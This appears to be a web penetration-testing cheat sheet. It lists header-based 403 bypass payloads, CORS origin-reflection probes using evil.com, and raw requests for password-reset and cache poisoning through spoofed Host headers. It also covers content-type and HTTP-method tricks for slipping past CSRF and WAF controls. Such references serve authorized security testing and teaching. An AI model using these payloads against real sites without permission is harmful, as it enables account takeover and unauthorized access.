---
title: "Headers & Bypasses"
---

## Security Header Checks

```bash
# Quick check
curl -sI https://<TARGET> | grep -iE '(strict-transport|content-security|x-frame|x-content-type|x-xss|referrer-policy|permissions-policy|access-control)'
```

## Headers for 403 Bypass

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

## CORS Headers to Test

```bash
# Check if origin is reflected
curl -sI https://<TARGET> -H "Origin: https://evil.com" | grep -i access-control

# Null origin
curl -sI https://<TARGET> -H "Origin: null" | grep -i access-control

# Subdomain match
curl -sI https://<TARGET> -H "Origin: https://sub.target.com" | grep -i access-control

# Prefix/suffix match
curl -sI https://<TARGET> -H "Origin: https://target.com.evil.com" | grep -i access-control
curl -sI https://<TARGET> -H "Origin: https://eviltarget.com" | grep -i access-control
```

## CORS Misconfiguration Impact

| Behavior | Severity |
|----------|----------|
| Reflects any Origin + Allow-Credentials | High — can steal data cross-origin |
| Accepts null Origin + Allow-Credentials | Medium — exploitable via sandboxed iframe |
| Reflects subdomain Origin + Allow-Credentials | Medium — chain with subdomain XSS |
| Wildcard (*) + no credentials | Low — public API, usually intended |

## Host Header Attacks

```bash
# Password reset poisoning
POST /forgot-password HTTP/2
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# X-Forwarded-Host
POST /forgot-password HTTP/2
Host: target.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

# Cache poisoning via Host
GET / HTTP/2
Host: target.com
X-Forwarded-Host: evil.com
# If response is cached → all users get poisoned response
```

## Content-Type Tricks

| Original | Try | Why |
|----------|-----|-----|
| `application/x-www-form-urlencoded` | `application/json` | May bypass CSRF protection |
| `application/json` | `application/x-www-form-urlencoded` | May bypass JSON-only WAF rules |
| `multipart/form-data` | `application/json` | Different parser, different bugs |
| `text/xml` | `application/json` | Parser confusion |

## HTTP Method Tricks

```bash
# Method override headers
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH

# Test alternate methods on restricted endpoints
curl -X OPTIONS https://<TARGET>/admin
curl -X PUT https://<TARGET>/admin
curl -X PATCH https://<TARGET>/admin
curl -X TRACE https://<TARGET>/admin
```
